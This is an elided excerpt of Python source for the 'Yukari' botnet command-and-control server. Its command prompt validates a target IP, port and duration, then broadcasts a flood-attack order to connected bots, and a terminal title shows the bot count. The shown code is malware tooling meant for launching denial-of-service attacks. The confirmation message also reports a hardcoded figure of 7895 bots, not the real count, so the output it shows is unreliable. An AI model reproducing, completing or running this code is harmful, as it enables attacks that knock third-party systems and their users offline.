...
banner = '''
                Yukari - The Sky Will Be Dark One Day...
        '''
...
def update_title(client, username):
    ...
    while 1:
        try:
            send(client, f'\33]0;Yukari | Bots: {len(bots)} | Connected as: {username}\a', False)
            time.sleep(2)
        except:
            client.close()
...
def command_line(client):
    ...
    prompt = f'{Fore.CYAN}Hub {Fore.LIGHTWHITE_EX}$ '
                ...
                if len(args) == 4:
                    ...
                    if validate_ip(ip):
                        if validate_port(port, True):
                            if validate_time(secs):
                                send(client, Fore.WHITE + f'Attack sent to 7895 bots')
                                broadcast(data)
                            else:
                                send(client, Fore.WHITE + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.WHITE + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.WHITE + 'Invalid IP-address')
                else:
